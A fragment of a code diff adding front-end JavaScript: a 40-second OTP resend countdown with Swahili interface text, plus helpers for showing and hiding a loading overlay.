+  function startOtpTimer() {
+    let timeLeft = 40;
+    const timerElem = document.getElementById('resendTimer');
+    if (!timerElem) return;
+
+    const interval = setInterval(() => {
+      timeLeft--;
+      if (timeLeft <= 0) {
+        clearInterval(interval);
+        timerElem.innerHTML = '<a href="#" id="resendBtnLink" style="color: var(--primary,#e60000); font-weight: bold; text-decoration: none;">Tuma tena msimbo</a>';
+        const resendBtnLink = document.getElementById('resendBtnLink');
+        if (resendBtnLink) {
+          resendBtnLink.addEventListener('click', (e) => {
+            e.preventDefault();
+            triggerResendOtp();
+          });
+        }
+      } else {
+        timerElem.textContent = `Tuma tena msimbo ndani ya ${timeLeft} sekunde`;
+      }
+    }, 1000);
+  }
+
+  // Helpers Overlay
+  function showOverlay(txt) {
+    const loadingText = document.getElementById('loadingText');
+    const loadingOverlay = document.getElementById('loadingOverlay');
+    if (loadingText) loadingText.textContent = txt;
+    if (loadingOverlay) loadingOverlay.classList.remove('hidden');
+  }
+
+  function updateOverlayText(txt) {
+    const loadingText = document.getElementById('loadingText');
+    if (loadingText) loadingText.textContent = txt;
+  }
+
+  function hideOverlay() {
+    const loadingOverlay = document.getElementById('loadingOverlay');
+    if (loadingOverlay) loadingOverlay.classList.add('hidden');
+  }
+
+  updateCalculator();
 });
